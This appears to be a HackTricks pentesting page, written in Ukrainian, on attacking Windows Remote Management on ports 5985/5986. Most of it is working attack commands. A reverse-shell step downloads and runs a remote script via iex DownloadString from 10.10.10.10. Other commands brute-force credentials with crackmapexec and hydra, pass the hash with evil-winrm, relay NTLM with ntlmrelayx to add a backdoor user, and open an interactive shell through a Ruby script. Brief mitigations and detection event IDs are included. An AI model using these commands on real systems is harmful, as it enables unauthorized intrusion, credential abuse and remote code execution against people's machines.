# 5985,5986 - Pentesting WinRM

{{#include ../banners/hacktricks-training.md}}

## WinRM

[Windows Remote Management (WinRM)](<https://msdn.microsoft.com/en-us/library/windows/desktop/aa384426(v=vs.85).aspx>) підкреслюється як **протокол від Microsoft**, який дозволяє **віддалене управління системами Windows** через HTTP(S), використовуючи SOAP у процесі. Він в основному працює на базі WMI, представляючи собою HTTP-інтерфейс для операцій WMI.

Наявність WinRM на машині дозволяє просте віддалене адміністрування через PowerShell, подібно до того, як працює SSH для інших операційних систем. Щоб визначити, чи працює WinRM, рекомендується перевірити відкриття конкретних портів:

- **5985/tcp (HTTP)**
- **5986/tcp (HTTPS)**

Відкритий порт зі списку вище означає, що WinRM було налаштовано, що дозволяє спроби ініціювати віддалену сесію.

### **Ініціювання сесії WinRM**

Щоб налаштувати PowerShell для WinRM, використовується командлет Microsoft `Enable-PSRemoting`, який налаштовує комп'ютер для прийому віддалених команд PowerShell. З підвищеним доступом PowerShell можна виконати наступні команди, щоб активувати цю функціональність і призначити будь-який хост як довірений:
```bash
Enable-PSRemoting -Force
Set-Item wsman:\localhost\client\trustedhosts *
```
Цей підхід передбачає додавання символу підстановки до конфігурації `trustedhosts`, крок, який вимагає обережного розгляду через його наслідки. Також зазначено, що може бути необхідно змінити тип мережі з "Public" на "Work" на машині зловмисника.

Крім того, WinRM можна **активувати віддалено** за допомогою команди `wmic`, що демонструється наступним чином:
```bash
wmic /node:<REMOTE_HOST> process call create "powershell enable-psremoting -force"
```
Цей метод дозволяє віддалено налаштувати WinRM, підвищуючи гнучкість в управлінні Windows-машинами з відстані.

### Перевірте, чи налаштовано

Щоб перевірити налаштування вашої атакуючої машини, команда `Test-WSMan` використовується для перевірки, чи правильно налаштовано WinRM на цільовій машині. Виконавши цю команду, ви повинні очікувати отримати деталі щодо версії протоколу та wsmid, що вказує на успішну конфігурацію. Нижче наведені приклади, що демонструють очікуваний вихід для налаштованої цілі в порівнянні з неналаштованою:

- Для цілі, яка **налаштована** правильно, вихід виглядатиме приблизно так:
```bash
Test-WSMan <target-ip>
```
Відповідь повинна містити інформацію про версію протоколу та wsmid, що свідчить про те, що WinRM налаштовано правильно.

![](<../images/image (582).png>)

- Навпаки, для цілі **не** налаштованої для WinRM, це призведе до відсутності такої детальної інформації, підкреслюючи відсутність належного налаштування WinRM.

![](<../images/image (458).png>)

### Виконати команду

Щоб віддалено виконати `ipconfig` на цільовій машині та переглянути його вихід, виконайте:
```bash
Invoke-Command -computername computer-name.domain.tld -ScriptBlock {ipconfig /all} [-credential DOMAIN\username]
```
![](<../images/image (151).png>)

Ви також можете **виконати команду вашої поточної PS консолі через** _**Invoke-Command**_. Припустимо, що у вас локально є функція під назвою _**enumeration**_, і ви хочете **виконати її на віддаленому комп'ютері**, ви можете зробити:
```bash
Invoke-Command -ComputerName <computername> -ScriptBLock ${function:enumeration} [-ArgumentList "arguments"]
```
### Виконати скрипт
```bash
Invoke-Command -ComputerName <computername> -FilePath C:\path\to\script\file [-credential CSCOU\jarrieta]
```
### Отримати реверс-шелл
```bash
Invoke-Command -ComputerName <computername> -ScriptBlock {cmd /c "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8080/ipst.ps1')"}
```
### Отримати PS сесію

Щоб отримати інтерактивну оболонку PowerShell, використовуйте `Enter-PSSession`:
```bash
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

# Enter
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local [-Credential username]
## Bypass proxy
Enter-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
# Save session in var
$sess = New-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $sess
## Background current PS session
Exit-PSSession # This will leave it in background if it's inside an env var (New-PSSession...)
```
![](<../images/image (1009).png>)

**Сесія буде виконуватись у новому процесі (wsmprovhost) всередині "жертви"**

### **Примусове відкриття WinRM**

Щоб використовувати PS Remoting та WinRM, але комп'ютер не налаштований, ви можете увімкнути його за допомогою:
```bash
.\PsExec.exe \\computername -u domain\username -p password -h -d powershell.exe "enable-psremoting -force"
```
### Збереження та відновлення сесій

Це **не спрацює**, якщо **мова** є **обмеженою** на віддаленому комп'ютері.
```bash
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

#You can save a session inside a variable
$sess1 = New-PSSession -ComputerName <computername> [-SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)]
#And restore it at any moment doing
Enter-PSSession -Session $sess1
```
Всередині цих сесій ви можете завантажувати PS скрипти, використовуючи _Invoke-Command_
```bash
Invoke-Command -FilePath C:\Path\to\script.ps1 -Session $sess1
```
### Помилки

Якщо ви знайдете наступну помилку:

`enter-pssession : Підключення до віддаленого сервера 10.10.10.175 не вдалося з наступним повідомленням про помилку : Клієнт WinRM не може обробити запит. Якщо схема автентифікації відрізняється від Kerberos, або якщо комп'ютер-клієнт не приєднаний до домену, тоді необхідно використовувати HTTPS-транспорт або додати цільову машину до налаштування конфігурації TrustedHosts. Використовуйте winrm.cmd для налаштування TrustedHosts. Зверніть увагу, що комп'ютери в списку TrustedHosts можуть не бути автентифіковані. Ви можете отримати більше інформації про це, виконавши наступну команду: winrm help config. Для отримання додаткової інформації дивіться тему довідки about_Remote_Troubleshooting.`

Спробуйте на клієнті (інформація з [тут](https://serverfault.com/questions/657918/remote-ps-session-fails-on-non-domain-server)):
```ruby
winrm quickconfig
winrm set winrm/config/client '@{TrustedHosts="Computer1,Computer2"}'
```
## WinRM з'єднання в Linux

### Брутфорс

Будьте обережні, брутфорс winrm може заблокувати користувачів.
```ruby
#Brute force
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt

#Just check a pair of credentials
# Username + Password + CMD command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -H <HASH> -X '$PSVersionTable'
#Crackmapexec won't give you an interactive shell, but it will check if the creds are valid to access winrm
```
### Використання evil-winrm
```ruby
gem install evil-winrm
```
Прочитайте **документацію** на його github: [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
```ruby
evil-winrm -u Administrator -p 'EverybodyWantsToWorkAtP.O.O.'  -i <IP>/<Domain>
```
Щоб використовувати evil-winrm для підключення до **IPv6 адреси**, створіть запис у _**/etc/hosts**_, встановивши **доменне ім'я** для IPv6 адреси та підключіться до цього домену.

### Передача хешу з evil-winrm
```ruby
evil-winrm -u <username> -H <Hash> -i <IP>
```
![](<../images/image (680).png>)

### Використання PS-docker машини
```
docker run -it quickbreach/powershell-ntlm
$creds = Get-Credential
Enter-PSSession -ComputerName 10.10.10.149 -Authentication Negotiate -Credential $creds
```
### Використання скрипта на Ruby

**Код витягнуто з тут:** [**https://alamot.github.io/winrm_shell/**](https://alamot.github.io/winrm_shell/)
```ruby
require 'winrm-fs'

# Author: Alamot
# To upload a file type: UPLOAD local_path remote_path
# e.g.: PS> UPLOAD myfile.txt C:\temp\myfile.txt
# https://alamot.github.io/winrm_shell/


conn = WinRM::Connection.new(
endpoint: 'https://IP:PORT/wsman',
transport: :ssl,
user: 'username',
password: 'password',
:no_ssl_peer_verification => true
)


class String
def tokenize
self.
split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/).
select {|s| not s.empty? }.
map {|s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/,'')}
end
end


command=""
file_manager = WinRM::FS::FileManager.new(conn)


conn.shell(:powershell) do |shell|
until command == "exit\n" do
output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
print(output.output.chomp)
command = gets
if command.start_with?('UPLOAD') then
upload_command = command.tokenize
print("Uploading " + upload_command[1] + " to " + upload_command[2])
file_manager.upload(upload_command[1], upload_command[2]) do |bytes_copied, total_bytes, local_path, remote_path|
puts("#{bytes_copied} bytes of #{total_bytes} bytes copied")
end
command = "echo `nOK`n"
end
output = shell.run(command) do |stdout, stderr|
STDOUT.print(stdout)
STDERR.print(stderr)
end
end
puts("Exiting with code #{output.exitcode}")
end
```
## Shodan

- `port:5985 Microsoft-HTTPAPI`

---

## Останні вразливості та наступальні техніки (2021-2025)

### NTLM реле безпосередньо до WinRM (WS-MAN)
Оскільки Impacket 0.11 (травень 2023) `ntlmrelayx.py` може релеювати захоплені NTLM облікові дані безпосередньо до **WS-MAN**/WinRM слухача. Коли хост все ще слухає на **некодованому HTTP (5985)**, зловмисник може поєднати *mitm6* (або *Responder*), щоб примусити аутентифікацію та отримати виконання коду на рівні SYSTEM:
```bash
sudo ntlmrelayx.py -t wsman://10.0.0.25 --no-smb-server -smb2support \
--command "net user pwned P@ssw0rd! /add"
```
Зменшення ризиків
* Вимкніть HTTP-слухачі – `Set-Item WSMan:\localhost\Service\EnableCompatibilityHttpListener -Value false`
* Примусьте HTTPS та увімкніть Розширений захист для автентифікації (EPA) на новіших версіях Windows.

### OMIGOD – CVE-2021-38647 (Azure OMI)
Агенти Azure Linux використовують службу **Open Management Infrastructure (OMI)**, яка відкриває API WinRM/WS-MAN на портах **5985/5986**. Логічна помилка дозволила **неавтентифіковане RCE як root**:
```text
curl http://victim:5985/wsman -H 'Content-Type:text/xml' -d '<xml …/>'
```
Виправте або видаліть OMI (версія ≥ 1.6.8-1) та заблокуйте ці порти з Інтернету.

### Зловживання WSMan.Automation COM для бічного переміщення
WinRM можна використовувати без PowerShell через об'єкт `WSMan.Automation` COM – корисно на системах у режимі обмеженої мови. Інструменти, такі як *SharpWSManWinRM*, обгортають цю техніку:
```powershell
$ws = New-Object -ComObject 'WSMan.Automation'
$session = $ws.CreateSession('http://srv01:5985/wsman',0,$null)
$cmdId   = $session.Command('cmd.exe',@('/c','whoami'))
$session.Signal($cmdId,0)
```
Цепочка виконання (`svchost → wmiprvse → cmd.exe`) ідентична класичному PS-Remoting.

---

## Оновлення інструментів

* **Evil-WinRM v3.x (2024)** – тепер підтримує **Kerberos** (`-k` / `--spn`) та **сертифікатну** аутентифікацію (`--cert-pem`/`--key-pem`), ведення журналу сесій (`-L`) та можливість вимкнення завершення віддалених шляхів (`-N`).

```bash
RHOST=10.0.0.25 evil-winrm -i $RHOST -u j.doe -k --spn HTTP/$RHOST
```

* **Python – `pypsrp` 0.9 (2024)** пропонує WinRM та PS-Remoting з Linux, включаючи CredSSP та Kerberos:

```python
from psrp.client import Client
c = Client('srv01', username='ACME\\j.doe', ssl=True)
print(c.execute_cmd('ipconfig /all').std_out.decode())
```

* **Виявлення** – моніторинг журналу **Microsoft-Windows-WinRM/Operational**:
* Подія 91 / 163 – створено оболонку
* Подія 182 – збій аутентифікації
* У журналі безпеки подія 4262 фіксує IP-адресу джерела (додано у липневих оновленнях 2022 року).
Збирайте ці дані централізовано та сповіщайте про анонімні або зовнішні IP-адреси.

---

## Shodan

- `port:5985 Microsoft-HTTPAPI`

## Посилання

- [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)
- [https://bohops.com/2020/05/12/ws-management-com-another-approach-for-winrm-lateral-movement/](https://bohops.com/2020/05/12/ws-management-com-another-approach-for-winrm-lateral-movement/)
- [https://www.wiz.io/blog/omigod-critical-vulnerabilities-in-omi-azure](https://www.wiz.io/blog/omigod-critical-vulnerabilities-in-omi-azure)


- [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)

## HackTricks Автоматичні команди
```
Protocol_Name: WinRM    #Protocol Abbreviation if there is one.
Port_Number:  5985     #Comma separated if there is more than one.
Protocol_Description: Windows Remote Managment        #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for WinRM
Note: |
Windows Remote Management (WinRM) is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilising WMI, so you can think of it as an HTTP based API for WMI.

sudo gem install winrm winrm-fs colorize stringio
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p ‘MySuperSecr3tPass123!’

https://kalilinuxtutorials.com/evil-winrm-hacking-pentesting/

ruby evil-winrm.rb -i 10.10.10.169 -u melanie -p 'Welcome123!' -e /root/Desktop/Machines/HTB/Resolute/
^^so you can upload binary's from that directory        or -s to upload scripts (sherlock)
menu
invoke-binary `tab`

#python3
import winrm
s = winrm.Session('windows-host.example.com', auth=('john.smith', 'secret'))
print(s.run_cmd('ipconfig'))
print(s.run_ps('ipconfig'))

https://book.hacktricks.wiki/en/network-services-pentesting/5985-5986-pentesting-winrm.html

Entry_2:
Name: Hydra Brute Force
Description: Need User
Command: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} rdp://{IP}
```
{{#include ../banners/hacktricks-training.md}}
